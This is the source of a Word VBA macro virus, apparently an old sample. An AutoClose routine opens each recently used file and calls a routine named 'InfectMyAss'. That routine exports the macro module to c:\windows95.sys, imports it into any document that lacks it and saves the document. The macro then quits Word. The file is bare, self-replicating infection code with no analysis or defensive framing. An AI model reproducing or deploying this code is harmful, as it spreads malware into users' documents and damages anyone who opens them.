   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Closer"
   Sub AutoClose()
   Application.WindowState = wdWindowStateMinimize
   RecMax = RecentFiles.Maximum
   For i = 1 To RecMax
   RecentFiles(i).Open
   Call InfectMyAss
   DocName = RecentFiles(i).Name
   'Documents(DocName).Close
   Next
   Application.Quit
   End Sub
   Sub InfectMyAss()
   On Error Resume Next

   Set ActDok = ActiveDocument.VBProject.VBComponents
   ActMod = Application.VBE.SelectedVBComponent.Name
   ActInf = False

   ActDok(ActMod).Export "c:\windows95.sys"

   For i = 1 To ActDok.Count
       If ActDok(i).Name = ActMod Then ActInf = True
   Next

   If ActInf = False Then
       ActDok.Import "c:\windows95.sys"
       ActiveDocument.SaveAs ActiveDocument.FullName
   End If
   End Sub
